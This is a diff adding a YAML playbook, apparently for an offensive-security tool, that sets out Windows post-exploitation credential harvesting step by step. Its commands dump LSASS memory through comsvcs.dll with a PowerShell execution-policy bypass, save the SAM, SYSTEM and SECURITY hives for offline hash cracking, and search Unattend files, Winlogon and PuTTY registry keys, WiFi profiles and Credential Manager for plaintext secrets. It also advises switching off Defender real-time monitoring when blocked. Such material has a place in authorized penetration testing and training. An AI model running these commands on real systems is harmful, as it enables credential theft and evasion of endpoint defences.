@@ -1,0 +1,75 @@
+id: windows-credential-hunting
+name: Windows Post-Exploitation & Credential Hunting
+category: post-exploitation
+description: Complete post-exploitation checklist for dumping credentials on Windows systems including LSASS memory, SAM/SYSTEM hives, DPAPI blobs, Credential Manager, Vault, Browser data, Unattend files, and KeePass.
+requires_shell: true
+target_os: windows
+tags:
+  - post-exploitation
+  - windows
+  - lsass
+  - sam
+  - dpapi
+  - mimikatz
+  - pypykatz
+  - secretsdump
+steps:
+  - id: wcred-lsass-comsvcs-dump
+    title: Native LSASS Dump via comsvcs.dll (No External Tools)
+    phase: post-exploitation
+    purpose: Create a full minidump of the LSASS memory space natively using PowerShell and built-in Windows DLL `comsvcs.dll` to bypass basic executable blockers.
+    command: powershell -ep bypass -c "$p = (Get-Process lsass).Id; rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $p C:\\Windows\\Temp\\lsass.dmp full; ls C:\\Windows\\Temp\\lsass.dmp"
+    expected_output:
+      - 'Mode                LastWriteTime         Length Name'
+      - '-a----        ...   ...                   ...    lsass.dmp'
+    common_mistakes:
+      - Requires Administrator / SYSTEM shell with `SeDebugPrivilege`.
+      - Modern Defender may detect `comsvcs.dll` arguments. If blocked, try ProcDump or Task Manager GUI dump.
+    if_success: Memory dump created! Download `lsass.dmp` and parse with `pypykatz lsa minidump lsass.dmp`.
+    if_failure: Defender blocked memory read. Run `Set-MpPreference -DisableRealtimeMonitoring $true` if elevated.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/stealing-credentials
+
+  - id: wcred-sam-system-registry-save
+    title: Extract SAM, SYSTEM, and SECURITY Registry Hives
+    phase: post-exploitation
+    purpose: Save the SAM and SYSTEM registry hives to disk to extract all local user NTLM hashes, cached domain credentials, and LSA secrets offline.
+    command: reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive /y && reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive /y
+    expected_output:
+      - 'The operation completed successfully.'
+    common_mistakes:
+      - Requires local Administrator rights.
+    if_success: Registry hives saved! Extract hashes with `secretsdump.py -sam sam.hive -system system.hive -security security.hive LOCAL`.
+    if_failure: Access denied. Ensure executing from an elevated command prompt.
+    references:
+      - https://wadcoms.github.io/
+
+  - id: wcred-unattend-autologon-hunting
+    title: Search Unattend.xml, Autologon & Configuration Passwords
+    phase: post-exploitation
+    purpose: Search common installation artifacts, Sysprep files, and registry keys for plaintext administrative passwords and autologon credentials.
+    command: type C:\\Windows\\Panther\\Unattend.xml 2>nul; type C:\\Windows\\Panther\\Unattended.xml 2>nul; reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword 2>nul; reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s 2>nul
+    expected_output:
+      - '<AdministratorPassword><Value>...</Value>'
+      - 'DefaultPassword    REG_SZ    Password123'
+    common_mistakes:
+      - XML values may be base64 encoded. Decode with `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($val))`.
+    if_success: Plaintext credentials discovered! Test on local and remote services.
+    if_failure: No unattend files found. Search user directories for `.kdbx` (KeePass) or `.config` files.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#unattended-files
+
+  - id: wcred-wifi-dpapi-hunting
+    title: Dump Saved WiFi Profiles & Vault Credentials
+    phase: post-exploitation
+    purpose: Extract all saved wireless network cleartext WPA2/WPA3 pre-shared keys and inspect Windows Vault credentials.
+    command: netsh wlan show profiles; cmdkey /list; powershell -ep bypass -c "Get-ChildItem -Path C:\\Users\\*\\AppData\\Local\\Microsoft\\Credentials\\ -Recurse 2>$null"
+    expected_output:
+      - 'Key Content            : CorporateWiFiPass2026!'
+      - 'Target: WindowsLive:target=...'
+    common_mistakes:
+      - Export specific profile key with `netsh wlan show profile name="<PROFILE>" key=clear`.
+    if_success: WiFi or Credential Manager targets found!
+    if_failure: No wireless cards configured on virtual machine.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/stealing-credentials
